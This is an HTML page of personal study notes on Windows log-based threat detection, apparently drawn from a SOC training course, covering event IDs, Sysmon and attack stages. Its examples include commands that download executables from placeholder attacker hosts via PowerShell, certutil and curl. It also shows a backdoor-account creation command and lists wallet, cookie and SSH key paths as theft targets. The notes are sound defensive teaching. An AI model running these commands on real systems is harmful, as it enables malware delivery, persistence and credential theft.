@@ -1,0 +1,526 @@
+<!DOCTYPE HTML>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<title>Sysmon</title>
+<meta name="description" content="Windows Security Monitoring">
+    <meta name="author" content="Massimo">
+    <link rel="stylesheet" href="Styles/Styles.css">
+</head>
+<body>
+    <!-- Dashboard iframe -->
+<div class="dashboard">
+    <iframe src="dashboardSOC.html" title="dashboardSOC"></iframe>
+</div>
+<!-- Header titolo -->
+<header>
+    <div class="line"></div>
+    <h3>Windows Security Monitoring</h3>
+</header>
+
+<div class="flex-container">
+    
+        <div id="inizio" class="tools-container">
+        <a href="#SecLog"  class="button-link">Security Log: Authentication</a>
+        <a href="#RdpBruteForce"  class="button-link">Detect RDP Brute Force</a> -_-
+        <a href="#SecLogMan"  class="button-link">Security Log: User Management</a>  
+        <a href="#BackUser"  class="button-link">Hunt for Backdoored Users</a> >_>      
+        <a href="#SysProcMon"  class="button-link">Sysmon: Process Monitoring</a>
+        <a href="#SysFilNet"  class="button-link">Sysmon:Files and Network</a>
+        <a href="#PSLogCmd"  class="button-link">PowerShell: History File</a> *_*
+        <a href="#InitialAccess"  class="button-link">Initial Access method</a>
+        <a href="#InitRDP"  class="button-link">Initial Access via RDP</a>
+        <a href="#InitPhishing"  class="button-link">Initial Access via Phishing</a>
+        <a href="#InitUSB"  class="button-link">Initial Access via USB</a> ^_^
+        <a href="#Discovery"  class="button-link">Discovery</a>
+        <a href="#PassGoogle"  class="button-link">Export Passwords Google</a> =(
+        <a href="#Collection" class="button-link">Detecting Collection</a>
+        <a href="#ToolTransfer"  class="button-link ">Ingress Tool Transfer</a>
+        <a href="#DetTransfer"  class="button-link ">Detecting Tool Transfer</a> ;)        
+        <a href="#CommandControl"  class="button-link">Command and Control</a>
+        <a href="#persistence"  class="button-link">Persistence</a>
+        <a href="#BackdooredUsers"  class="button-link">Detecting Backdoored Users</a>
+        <a href="#PersTaskServ"  class="button-link">Persistence: Tasks and Services</a>
+        <a href="#PersRunKeyStartup"  class="button-link">Persistence: Run keys and Startup</a>        
+        </div>
+<div class="sub-container">
+    <p><i>Logging Overview</i> = Every recorded event is called a log<br>
+    <i>Incident Response:</i> Logs can show when and how the attack occurred<br>
+    <i>Threat Hunting:</i> Logs allow you to search for signs of malicious activity<br>
+    <i>Alerting and Triage:</i> Logs are a building block of any alert or detection rule<br>
+    <i>Every EVTX file corresponds to a specific log category.</i><br>
+    <i>Reading Event Logs </i>: search for "Event Viewer" using Windows Search or press Win + R, type eventvwr, and press Enter<br></p>
+    <hr>
+    <h2 id="SecLog">Security Log: Authentication</h2> 
+    <table>
+        <tr><td class="EventID">4624<br> (Successful Logon)</td><td>Detect suspicious RDP/network logins and identify the attack starting point</td><td>Logged on the target machine, the one you are trying to access	</td><td>Noisy. You will see hundreds of logon events per minute on loaded servers</td></tr>
+        <tr><td class="EventID">4625<br> (Failed Logon)</td><td>Detect brute force, password spraying, or vulnerability scanning</td><td>Logged on the target machine, the one you are trying to access	</td><td>Inconsistent. The logs have lots of caveats that may trick you into the wrong understanding of the event</td></tr>
+    </table>  
+    <p>Structure of 4624:</p>
+    <ul>
+        <li>Logon Information : abbiamo bisogno di sapere il Logon type (= login method) es. 10 for RDP, 3 for Network</li>
+        <li>New Logon: annotare il Logon ID</li>
+        <li>Network Information: Source IP può esser affidabile, ma hostname no!</li>
+    </ul>
+    <h3 id="RdpBruteForce">Usage of 4624/4625 > Detect RDP Brute Force :</h3>
+    <ol> 
+        <li>Open Security logs and filter for 4625 event ID (Failed login attempts)</li>
+        <li> Look for events with Logon Type 3 and 10 (Network and RDP logins)<ul>
+            <li>For most modern systems, the logon type will be 3 (since NLA is enabled by default)</li>
+            <li>For older or misconfigured systems, the logon type will be 10 (since NLA is not used) </li>
+        </ul></li>
+        <li>Every event is now worth your attention, but the main red flags are:<ul>
+            <li>Many attempted users like admin, helpdesk,  and cctv (Indicates password spraying) </li>
+            <li>Many login failures on a single account, usually Administrator (Indicates brute force) </li>
+            <li>Workstation Name does not match a corporate pattern (e.g. kali instead of THM-PC-06) </li>
+            <li>Source IP is not expected (e.g. your printer trying to connect to your Windows Server) </li>
+        </ul></li>
+    </ol>
+    <h4>Analyse RDP Logons:</h4>
+    <ol>
+        <li>Open Security logs and filter for 4624 event ID (Successful logins)</li>
+        <li>Look for events with Logon Type 10 (RDP logins)<ul>
+            <li>If NLA is enabled, every RDP logon event is preceded by another 4624 with logon type 3 </li>
+            <li>To get a real Workstation Name, you need to check the preceding logon type 3 event </li>
+        </ul></li>
+        <li>Your red flags are either a preceding brute force or a suspicious source IP / hostname</li>
+        <li>If you assume that the login was indeed malicious, find out what happened next:<ul>
+            <li>Windows assigns a Logon ID to every successful login (e.g. 0x5D6AC) </li>
+            <li>Logon ID is a unique session identifier. Save it for future analysis! </li>
+        </ul></li>
+    </ol>
+    <p><i>Network Level Authentication (NLA)</i> is a security feature used in Remote Desktop Services that requires users to authenticate before establishing a remote desktop session. </p>
+    <p>Se il log non è troppo grande, basta usare i filtri ID 4625 per individuare IP sospetto e poi 4624 per LogonType 10 e LogonID con successful login  (vedi stesso IP)</p>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+    <h2 id="SecLogMan">Security Log: Management</h2>
+    <table><tr><td class="EventID">4720 / 4722 / 4738</td><td class="EventID">A user account was created / enabled / changed</td><td>Attackers might create a backdoor account or even enable an old one to avoid detection 
+</td></tr>
+    <table><tr><td class="EventID">4725 / 4726		</td><td class="EventID">A user account was disabled / deleted</td><td>In some advanced cases, threat actors may disable privileged SOC accounts to slow down their actions
+</td></tr>
+    <table><tr><td class="EventID">4723 / 4724</td><td class="EventID">A user changed their password /User's password was reset</td><td>Given enough permissions, threat actors might reset the password and then access the required user</td></tr>
+    <table><tr><td class="EventID">4732 / 4733</td><td class="EventID">A user was added to /removed from a security group</td><td>Attackers often add their backdoor accounts to privileged groups like "Administrators"</td></tr>
+    </table>
+    <p><b>Structure of User Management Events:</b>All user management events have a similar structure and can be split into three parts: who did the action (Subject), who was the target (Object), and which exact changes were made (Details):</p>
+    <ul>
+        <li>Subject: The account doing the action. Note the Logon ID field - you can use it to correlate this event with the preceding 4624 login event!</li>
+        <li>Object: This can be named differently depending on an event ID (e.g. New Account or Member), but it always means the same - the target of the action.</li>
+        <li>Details: A target group for 4732 and 4733 events, or new user's attributes like full name or password expiration settings for the 4720 event.</li>
+    </ul>
+    <h3 id="BackUser">Usage of User Management Events > Hunt for Backdoored Users :</h3>
+    <ol>
+        <li>Open Security logs and filter for 4720 / 4732 event IDs</li>
+        <li>Manually review every event; your red flags are:
+            <ul>
+                <li>No one from your IT department can confirm the action</li>
+                <li>Changes were made during non-working hours or on weekends</li>
+                <li>The subject user's name is unknown or unexpected to you	(e.g. "adm.old.2008" creating new Windows users)</li>
+                <li>The target user's name does not follow a usual naming pattern (e.g. "backup" instead of "thm_svc_backup")</li>
+            </ul>
+        </li>
+        <li>If you confirmed that the action was malicious, find out the login details:
+            <ul>
+                <li>Copy the Logon ID field from your 4720 / 4732 event</li>
+                <li>Find the corresponding login event with the same Logon ID</li>
+                <li>Refer to the workbooks from the previous task for further analysis</li>
+            </ul>
+        </li>
+
+    </ol>
+    <p>Provare questo comando al posto di 0x0 scrivere il logon ID sospetto! <br>
+<code>Get-WinEvent -LogName Security | Where-Object { $_.Message -like '*Logon ID: 0x0*' }</code><br>
+Esempio:<br>
+<code>Get-WinEvent -Path "C:\Users\Administrator\Desktop\Practice-Security.evtx" | Where-Object {$_.Message -like '*0x183C36D*'}</code></p><br>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+    <h2 id="SysProcMon">Sysmon: Process Monitoring</h2>    
+
+<table>
+    <tr><td class="EventID">4688<br> (Security Log: Process Creation)</td><td class="EventID">Log an event every time a new process is launched, including its command line and parent process details</td><td>Disabled by default, you need to enable it by following the official documentation</td></tr>
+    <tr><td class="EventID">1 <br>(Sysmon: Process Creation)	</td><td class="EventID">Replace 4688 event code and provide more advanced fields like process hash and its signature	</td><td>Sysmon is an external tool not installed by default. Check out the Sysmon official page</td></tr>
+</table>
+<p>Once installed, Sysmon logs are found in Event Viewer under <code>Applications & Services -> Microsoft -> Windows -> Sysmon -> Operational.</code></p>
+<p><i>Sysmon Event ID 1 in Action:</i><br>
+<b>Process Info:</b> Context of the launched process, including its PID, path (image), and command line<br>
+<b>Parent Info:</b> Context of the parent process, very useful to build a process tree or an attack chain<br>
+<b>Binary Info:</b> Process hash, signature, and PE metadata. You will need it for more advanced rooms<br>
+<b>User Context:</b> A user running the process and, most importantly, Logon ID - same as in the Security logs<br>
+</p>
+<p>Since almost any attack works on the endpoint level and requires at least some process to be launched to breach the system or exfiltrate the data from it, process monitoring is the most important log source for any SOC team. Use the following workbook to perform a basic analysis of any process launch:
+<br>Analyze Process Launch:<br>
+</p>
+<ol>
+    <li>Open Sysmon logs and filter for event ID 1</li>
+    <li>Review the fields from the process and binary info groups. The red flags are:
+        <ul>
+            <li>Image is in an uncommon directory like C:\Temp or C:\Users\Public</li>
+            <li>Process is suspiciously named like aa.exe or jqyvpqldou.exe</li>
+            <li>Process hash (MD5 or SHA256) matches as malware on VirusTotal</li>
+        </ul>
+    </li>
+    <li>Review the fields from the parent process group. The red flags are:
+        <ul>
+            <li>Parent matches red flags from step 2 (suspicious name, path, or hash)</li>
+            <li>Parent is not expected (e.g. Notepad launching some CMD commands)</li>
+            
+        </ul>
+    </li>
+    <li>If still in doubt, go up the process tree until you are confident in your verdict:
+        <ul>
+            <li>Find the preceding event where ProcessId equals ParentProcessId in your event</li>
+            <li>Analyze it by following steps 2 and 3 (suspicious parent, name, path, or hash)</li>            
+        </ul>
+    </li>
+    <li>Finally, trace the attack chain by filtering all Security and Sysmon events with the same Logon ID</li>    
+</ol>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+    <h2 id="SysFilNet">Sysmon: Files and Network</h2>    
+    <table>
+        <tr><td class="EventID">11 / 13 <br> (File Create / Registry Value Set)	</td><td class="EventID">4656 for file changes and 4657 for registry changes, both disabled by default</td><td>Detect files dropped by malware or its changes to the registry (e.g. for persistence)</td></tr>
+        <tr><td class="EventID">3 / 22 <br> (Network Connection / DNS Query)</td><td class="EventID">No direct alternative, requires additional firewall and DNS configuration</td><td>Detect traffic from untrusted processes or to known malicious destinations
+</td></tr>
+    </table>
+
+    <p><i>Usage of Sysmon Events:</i>> Analyse Process Activities </p>
+    <ol>
+        <li>Copy the ProcessId field from the event ID 1</li>
+        <li>Search for other Sysmon events with the same ProcessId</li>
+        <li>Your red flags for network connection events are:
+            <ul>
+                <li>Connection to external IPs on port 80 or on non-standard ports like 4444</li>
+                <li>Connection to known malicious IPs (e.g. by checking on VirusTotal)</li>
+                <li>DNS queries to suspicious domains (*.top, *.click, or hpdaykfpadvsl.com)</li>
+            </ul>
+        </li>
+        <li>Your red flags for file and registry changes are:
+            <ul>
+                <li>Files dropped to staging directories like C:\Temp or C:\Users\Public</li>
+                <li>Dropped file is a script (.bat or .ps1) or an executable file (.exe or .com)</li>
+                <li>Created files or registry keys are used for persistence (soon on it later!)</li>
+            </ul>
+        </li>
+
+    </ol>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+    <h2 id="PSLogCmd">PowerShell: Logging Commands</h2>    
+        <h5>Overview</h5>
+        <code>PS C:\> Get-ChildItem <br>
+PS C:\> Get-Content secrets.txt<br>
+PS C:\> Get-LocalUser; Get-LocalGroup<br>
+PS C:\> Invoke-WebRequest http://c2server.thm/a.exe -OutPath C:\Temp\a.exe <br>
+</code>
+<p>Here, the threat actor managed to read a sensitive file, view local users and groups, and even download malware to the Temp directory. Still, you will see a single event ID 1 stating that powershell.exe was launched, with no information about the executed commands.</p>
+<h5>How It works</h5>
+<p>Every program has a specific purpose: firefox.exe is a web browser, notepad.exe is a text editor, and whoami.exe simply outputs your username. If you're just browsing the web, you might only create a single Firefox process. However, with every out-of-scope task like RDP access or photo editing, you will have to open new programs and create additional logs.
+<br>
+PowerShell, on the other hand, is a powerful all-in-one tool for managing the system. Once you launch powershell.exe, you can run hundreds of different commands within the same terminal session without creating new processes for each action. This is why Sysmon is not very helpful here, and you'll need to find an alternative logging approach.   
+</p>
+<h2>PowerShell History File</h2>
+<p>There are at least five methods to monitor PowerShell, each with its own pros and cons. We will focus on a simple but effective way to track PowerShell commands - the PowerShell history file:</p>
+<p><code>C:\Users\< USER >\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt </code>  <b><-- Qui c'è l'elenco dei comandi PS utilizzati!</b></p>
+<p><br>The PowerShell history file is a plain text file automatically created by PowerShell. It simply records every command you type into a PowerShell window and is immediately updated when you press Enter to submit a command</p>
+<h5>Key Notes</h5>
+<ul>
+    <li>The history file is very useful for tracking malicious actions like system discovery or malware download</li>
+    <li>The history file is created for every user, meaning that you may see five files if there are five active system users</li>
+    <li>It survives system reboots unless manually deleted and saves all PowerShell commands entered for all time</li>
+    <li>It does not log command outputs and does not show script content (e.g. when running powershell .\script.ps1)</li>
+</ul>    
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+    <h2 id="InitialAccess">Initial Access method</h2>    
+    <p>You will explore various Initial Access methods, but for now, let's divide them into two groups: those requiring an exposed service and those relying on human interaction.</p>
+    <ol>
+        <li>Exposed Services <ul>
+            <li>Putting a Windows server directly on the Internet is a common task for IT teams - corporate websites require an open HTTP port to show content, a mail server can't handle emails without an active SMTP port, and IT admins need RDP to manage the machine remotely. However, every exposed service introduces major security risks. Within minutes, your exposed system can be scanned by automated bots looking for open ports, weak passwords, or unpatched vulnerabilities. And if something is not protected enough, threat actors will use their chance, as proven by these MITRE techniques: <ul>
+                <li>> T1133 / External Remote Services: Threat actors will look for exposed RDP/VNC/SSH with weak passwords to get remote access to the machine</li>
+                <li>> T1190 / Exploit Public-Facing Application: Threat actors will look for misconfigured or vulnerable websites and applications</li>
+            </ul></li>
+        </ul></li>
+        <li>User-Driven Methods<ul>
+            <li>But how can the laptop be infected if it is not Internet-exposed? Indeed, unless you help the threat actors yourself, it is very hard to infect your laptop. However, people often help threat actors by clicking on malicious links, launching phishing attachments, using pirated software, picking up unknown USB devices, and so on. And since humans are still the weakest link in cyber security and Windows is the most popular OS for user workstations, you are very likely to handle user-driven Windows Initial Access alerts frequently. The methods are covered by these MITRE techniques:<ul>
+                <li>> T1566 / Phishing: Threat actors employ different phishing techniques, tricking users into launching the malware themselves</li>
+                <li>> T1091 / Removable Media: Threat actors infect a USB device and hope that users will use the USB on multiple PCs</li>
+            </ul></li>
+        </ul></li>
+    </ol>   
+    <a href="https://services.google.com/fh/files/misc/m-trends-2025-en.pdf" target="_blank"  title="reports2025">Reports on modern Initial Access tendencies</a><br><br>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+    <h3 id="InitRDP">Initial Access via RDP</h3>   
+    <p><b>Detecting RDP Breach</b></p> 
+    <p>Step of attack and Detection Opportunity:</p>
+    <ol>
+        <li><b>Network Scan</b> - Botnet scans our IP and detects an exposed RDP port <ul>
+            <li>N/A. Network attacks are out of the room scope</li>
+        </ul></li>
+        <li><b>RDP Brute Force</b> - Botnet starts a brute force of common user names (Administrator, admin, support, etc.)
+        <ol>
+            <li>Open Security logs and filter for the failed logins (event ID 4625)</li>
+            <li>Filter for logon types 3 and 10, meaning remote logons</li>
+            <li>Filter for logins from external IPs (use "Source IP" field)</li>
+            <li>That's it. You have detected a potential RDP brute force</li>
+        </ol>	</li>
+        <li><b>Initial Access via RDP</b> - After around 100 attempts, the botnet guesses the correct password and enters the system	<ol>
+            <li>Continue with the list from the previous step</li>
+            <li>Switch the event ID filter to 4624 (successful logins)</li>
+            <li>Check the account under which the logon was made</li>
+            <li>Now you know which account was used for the Initial Access</li>
+        </ol></li>
+        <li><b>Further Malicious Actions</b> - Two hours after the breach, the threat actor logs in via RDP and reviews the Desktop	<ol>
+            <li>Continue with the list from the previous step</li>
+            <li>Filter for logon type 10, indicating interactive RDP login</li>
+            <li>Copy the "Logon ID" field from the logon event</li>
+            <li>Open Sysmon logs and search events with the same "Logon ID"</li>
+            <li>You will see all processes started by the threat actor via RDP</li>
+        </ol></li>
+    </ol>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+    <h3 id="InitPhishing">Initial Access via Phishing</h3>    
+    <p>Phishing attacks are still a major threat as they can't be mitigated as easily as blocking RDP access.</p>
+    <ul>
+        <li><b>Binary Attachments:</b> In Windows, there are lots of executable extensions, and while most people know not to open untrusted .exe files, they are usually less cautious about .com, .scr, or .cpl files. </li>
+        <li><b>LNK Attachments:</b> To avoid AV detection, threat actors may prefer attaching PowerShell, Visual Basic, or BAT scripts over binaries. A popular way to make the scripts look trustworthy is to hide them behind LNK shortcuts - the same files you have on your Desktop that point to real executables somewhere in the Program Files folder.<br>
+Threat actors can include any command inside the LNK "Target" field, as well as set any shortcut icon. You can verify it by right-clicking the LNK file, selecting "Properties", and viewing the "Shortcut" tab. </li>
+    </ul>
+    <p><b>Detecting Malicious Download:</b>It is relatively simple to hunt for malicious downloads if you know how the victim sees it. First, the user uses a web browser or desktop application to open a phishing attachment. In the simplest case, it would be a direct .exe malware download, but you are far more likely to see an archive attachment like .zip or .rar containing the malware. In this case, Sysmon can greatly help you detect every attack stage.<br>
+    <b>"Notes on LNK Attachments"</b> Unlike with binary attachments, LNK files have a very interesting and important capability - they leave little execution trace. Consider the case on the screenshot below, where a user downloaded LNK file that looks like a Google Chrome shortcut, but in fact runs some PowerShell payload. !!!</p>
+    <p>After the user launches the shortcut - Windows Explorer reads the "Target" field of the LNK and makes it look like explorer.exe launches PowerShell directly. Still, you can identify if it was indeed LNK phishing or another attack vector by looking for the preceding file creation events - LNK files must have appeared somewhere in Downloads before</p>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+    <h3 id="InitUSB">Initial Access via USB</h3>    
+    <p><b>Risk of Removable Media:</b>Initial Access via an infected USB bypasses firewalls, much like phishing, and can start the attack chain even without Internet access and continue spreading without user interaction.</p>
+    <ul>
+        <li><b>USB Delivery Case:</b> Imagine working for TryHatMe Inc. and receiving a delivery package with a fancy hat and a USB labelled as "A gift from HR". You plug it in, a harmless GIF pops up, and you call HR to thank them for the present. But while the HR figures out what you meant, the malware from the USB has already spread to your laptop. (Real-World Case)</li>
+        <li><b>Print Service Case:</b> Another common scenario involves third-party entities like a print service. Suppose you visit one and hand over your USB to print a document. Their system, already infected with a worm, passes the malware onto your flash drive. Then, you bring the malware back to your home PC, and the infection chain continues. Now, let's learn how to detect this before it's too late! (Real-World Story)</li>
+    </ul>
+    <h5>Detecting an Infected USB</h5>
+    <p>Although there are many advanced techniques on how to run the malware from USB automatically as soon as the flash drive is plugged in, the majority of cases occur just because the user launches malware themselves. <br> For example: <br></p>
+    <ul>
+        <li>Malware hides all legitimate files on USB and creates a malicious "RECOVERY.lnk" file</li>
+        <li>Malware creates a "Photos.exe" binary and sets its icon to look like a simple folder</li>
+        <li>Malware creates double-extension copies of all files, like "photo_2024_1_12.jpg.exe"</li>
+    </ul>
+    <p><i>(Interestingly, the detection of Initial Access via USB looks very similar to the phishing attachments. Since both methods rely on a user running malicious binary via a graphical interface (explorer.exe))</i></p>
+    
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+      
+    <a href="https://attack.mitre.org/tactics/TA0007/" target="_blank"  title="Discovery"><h2 id="Discovery">Discovery</h2>  </a>
+    <p><i>Discovery Commands > Discovery Purpose + Common CMD / PowerShell Commands:</i></p>
+    <ul>
+        <li>Files and Folders - (To find out the host purpose, victim's job, or their interests) <ul>
+            <li><code>type < file >, Get-Content < file >, dir < folder >, Get-ChildItem < folder >< / folder></code></li>
+        </ul>	</li>
+        <li>Users and Groups -(To find out who uses the host and with which privileges)<ul>
+            <li><code>whoami, net user, net localgroup, query user, Get-LocalUser</code></li>
+        </ul></li>
+        <li>System and Apps - (To find out vulnerabilities or apps to steal data from)<ul>
+            <li><code>tasklist /v, systeminfo, wmic product get name,version, Get-Service</code></li>
+        </ul></li>
+        <li>Network Settings -(To find out if the host belongs to a corporate network)	<ul>
+            <li><code>ipconfig /all, netstat -ano, netsh advfirewall show allprofiles</code></li>
+        </ul> </li>
+        <li>Active Antivirus - (To find out how risky it is to continue the attack without being blocked)	<ul>
+            <li><code>Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"</code></li>
+        </ul></li>
+    </ul>
+    <p><b>Discovery Process:</b> Recall the phishing attack chain from the previous room. After the attachment is launched, it runs basic discovery commands to identify the victim or even delete itself if a specific antivirus is installed or a victim is not from a targeted company or country. Then, it connects back to the threat actor, giving full control over the victim. From there, human attackers can type additional Discovery commands if required.
+</p>    
+    <p><b>Discovery via CMD: </b>Discovery via the command line is the most common and easiest method available for threat actors. </p>
+    
+    <p><b>Discovery via GUI: </b>In cases where threat actors log in to the system interactively, like after the RDP breach, they are not limited to console commands</p>
+    <h5>Detecting Discovery</h5>
+    <p>The first task to detect a potential Discovery is to find a Discovery command, or better, a sequence of commands run during a short period of time
+You will see them as process creation events tracked by Sysmon event ID 1 or as new rows in the PowerShell history file. There are lots of Discovery commands, so be prepared to use the search engine if you are not sure what the command means.
+<br>
+ For now, you can build the process tree using Sysmon logs: filter for process creation events and correlate ProcessId and ParentProcessId fields</p>
+    <h4>Searching Secrets</h5>
+    <p> This process involves three more MITRE tactics: Collection, Credential Access, and Exfiltration (To make it simpler, let's treat Credential Access as a part of Collection).</p>
+        <a href="https://attack.mitre.org/tactics/TA0009/" target="_blank"  title="ta9">MITRE-TA0009</a>
+        <a href="https://attack.mitre.org/tactics/TA0006/" target="_blank"  title="ta6">MITRE-TA0006</a>
+        <a href="https://attack.mitre.org/tactics/TA0010/" target="_blank"  title="ta10">MITRE-TA0010</a>
+    <h5>Collection Targets</h5>
+    <p>The targets drastically differ depending on the attackers' goals. Some adversaries hunt personal info like images or chat conversations; others look for crypto wallets, gaming, or banking accounts; and advanced groups just use the victim to access the corporate network, hoping for a full-scale ransomware encryption.
+<b>Note that while most of the sensitive data is stored as simple files, the secrets can also be hidden in the registry or in process memory.</b> You can review the common Collection targets in the code block below:
+<br>
+<b>->[Goal: Blackmail Victim]</b> Photos, Chats, Browser History<br><code>
+C:\Users\< user >\AppData\Roaming\Signal\*<br>
+C:\Users\< user >\AppData\Local\Google\Chrome\User Data\Default\History</code><br>
+
+<b>->[Goal: Steal Money]</b> Web Banking Sessions, Crypto Wallets<br><code>
+C:\Users\< user >\AppData\Roaming\Bitcoin\wallet.dat<br>
+C:\Users\< user >\AppData\Local\Google\Chrome\User Data\Default\Cookies</code><br>
+
+<b>->[Goal: Steal Corporate Data]</b> SSH Credentials, Databases<br><code>
+C:\Users\< user >\.ssh\*<br>
+C:\Program Files\Microsoft SQL Server\...\DATA\*</code>
+<br>
+</p>
+    <h5>Exfiltrating Data</h5>
+    <p>Data collection can be performed automatically via scripts or manually by human threat actors. For scripts, the whole process usually takes less than a minute, but it may take hours for the attacker to find and review the interesting files. Still, both methods should eventually end with exfiltration - uploading stolen data to a controller server. Here, threat actors can be very creative - to avoid detection, they often:
+<br>
+<i>- Exfiltrate stolen data to DropBox, Mega, Amazon S3, or other trusted cloud storage services (Examples)<br></i>
+<i>- Exfiltrate stolen data to known code repositories like GitHub or messengers like Telegram (Example)<br></i>
+<i>- Or just create a trustworthy-looking domain like "windows-updates.com" and send the data there<br></i>
+<br>
+<b id="PassGoogle">Per password da google chrome,</b> basta andare su password manager, export csv, e ci sono elencate tutte le password (compresi nomi utenti)
+<br><br>
+Which interesting SSH key does the user store on disk?  <b>--> nella cartella .ssh  troviamo le chiavi thm-access-database.key</b></p><br>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+    <h2 id="Collection">Detecting Collection</h2>
+    <p>Same as with Discovery, threat actors can use both command-line and graphical interface options to review sensitive files. However, in Collection, threat actors don't just check a system configuration but rather look for specific files and folders shown in the previous task. Thus, you can detect access to the files by tracking commands like:</p>
+    <ul>
+        <li>notepad.exe C:\Users\<user>\Desktop\finances-2025.csv		<ul>
+            <li>Threat actors used Notepad to check content of the interesting file</li>
+        </ul></li>
+        <li>CMD: type debug-logs.txt | findstr password > C:\Temp\passwords.txt	<ul>
+            <li>Threat actors searched for the "password" keyword in a specific file</li>
+        </ul></li>
+        <li>PowerShell: Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf	<ul>
+            <li>Threat actors searched for PDF files in the user's home folder</li>
+        </ul></li>
+        <li>PowerShell: copy C:\Users\<user>\AppData\Roaming\Signal С:\Temp\	<ul>
+            <li>Threat actors copied Signal chat history to the Temp directory</li>
+        </ul></li>
+        <li>PowerShell: Compress-Archive С:\Temp\ С:\Temp\stolen_data.zip	<ul>
+            <li>Threat actors archived the stolen data, preparing for exfiltration</li>
+        </ul></li>
+        <li>7za.exe a -tzip C:\Temp\stolen_data.zip С:\\Temp\\*.*	<ul>
+            <li>Alternatively, threat actors can use the existing archiving software like 7-Zip</li>
+        </ul></li>
+    </ul>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+    <h2 id="ToolTransfer">Ingress Tool Transfer</h2>
+    <p><b>how attacks start: </b> not from a fully functional malware, but from a tiny phishing attachment or from an RDP session without any red team tools. Thus, at some attack stages, threat actors may need to download more tools to achieve their goals, for example:</p>
+    <ol>       
+        <li>A script to automate Discovery and find common vulnerabilities like Seatbelt</li>
+        <li>A tool to extract saved passwords or OS credentials like Mimikatz</li>
+        <li>A fully functional Remote Access Trojan (RAT) like Remcos RAT</li>
+        <li>Finally, a ransomware binary to encrypt the system after the data is stolen</li>
+        <li>The process of downloading additional malware to the breached system is mapped to the MITRE Ingress Tool Transfer technique, and it is used in the majority of breaches. You have already seen an example where a LNK attachment used PowerShell to download additional malware, but there are many other ways to transfer malware even without PowerShell!</li>
+    </ol>
+    <a href="https://attack.mitre.org/techniques/T1105/" target="_blank"  title="T1105">MITRE-T1105</a><br>
+    <p><b>Common Tool Transfer Command</b></p>
+    <ul>        
+        <li>Via Certutil -<code>certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe</code></li>
+        <li>Via Curl (Windows 10+) - <code>curl.exe https://blackhat.thm/bad.exe -o good.exe</code></li>
+        <li>Via PowerShell IWR - <code>powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"</code></li>
+        <li>Via Graphical Interface	- <code>No need to use CMD, just copy-paste malware via RDP or download them via a web browser!</code></li>
+    </ul>
+    <p><i>IWR = </i><a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.5" target="_blank"  title="IWR">Invoke-WebRequest </a><br></p>
+    <h3 id="DetTransfer">Detecting Tool Transfer</h3>
+    <p>Since a transfer requires a network connection, your best option would be to track a network connection or a DNS request from the suspicious process. Note, however, that threat actors often try to avoid detection by downloading the tools from legitimate services like GitHub, so make sure to analyze which process is making the connection, the destination domain, and the file being downloaded.</p>
+    <ol>
+        <li>event ID 1 Cmd is launched</li>
+        <li>event ID 1 Curl.exe starts download</li>
+        <li>event 11 the file is downloaded</li>
+        <li>event 22 connection / delayed event, should be id 3</li>
+    </ol> 							
+		
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+
+    <h2 id="CommandControl"><a href="https://attack.mitre.org/tactics/TA0011/" target="_blank"  title="TA0011">Command and Control</a></h2>
+    <p><b>Attacks Without C2:</b>In some cases, C2 is not needed at all. For example, threat actors can type their commands directly in the RDP session after an RDP breach. Since this method becomes unavailable as soon as RDP is closed or secured, most threat actors choose to still set up a C2 immediately after the breach. </p>
+    <p><b>Simplest C2: </b>For other Initial Access methods, threat actors can't simply use RDP every time they need to run a command, so they need some process that connects back to the attackers and waits for their commands 24/7. In the simplest case, the phishing attachment will be that process and establish the Command and Control channel, like on the CobaltStrike C2 <br>
+In more advanced cases, the attachment won't immediately connect back, but rather download an additional C2 malware, hide it in a folder like C:\Temp, and run it as a new stealthy process. This method is beneficial to keep the attack going if the victim decides to delete the original attachment. See how it worked in the recent ransomware cases and during the APT29 phishing campaign</p>
+       
+
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+    <h2 id="persistence">Persistence</h2>
+    <p> Data stealer infections usually have a very short lifespan: they breach the victim, collect the data, exfiltrate it, and exit - all within minutes. However, for most other attacks, maintaining access to the victim for days or even months after the Initial Access is vital. The tactic of maintaining reliable, long-term access to the target that can survive reboots and password changes is called Persistence - a big and interesting topic that you will discover soon.</p>
+    <h3>Persisting via RDP</h3>
+    <p>Many Windows breaches happen because of the exposed service: RDP with a weak password, a vulnerable mail server, or a misconfigured web app. For such scenarios, the threat actors can access the machine via the same exposed service over and over again until the vulnerability is fixed. Still, threat actors often deploy an additional Persistence method, for example:</p>
+    <ul>
+        <li>Create an additional hidden vulnerability in the breached service <b>(e.g. a backdoor or a web shell)</b></li>
+        <li>Create a new user <b>(T1136)</b>, make it an administrator <b>(T1098)</b>, and use it for further RDP logins</li>
+    </ul>
+    <p>Let's focus on the second method now and see how you or threat actors can manage users on Windows. The first option is to use the graphical utility by searching for "Computer Management" or by launching lusrmgr.msc. The second option is to use a command line, like in the example below:<br>
+    <b>CMD and PowerShell Commands to Manage Users</b><br>
+    <code><b># 1. Two methods to create the "mr.backd00r" user</b><br>
+CMD C:\> net user "mr.backd00r" "p@ssw0rd!" /add<br>
+PS  C:\> New-LocalUser "mr.backd00r" -Password [...]</code><br><br>
+    <code><b># 2. Two methods to add the user to Administrators </b><br>
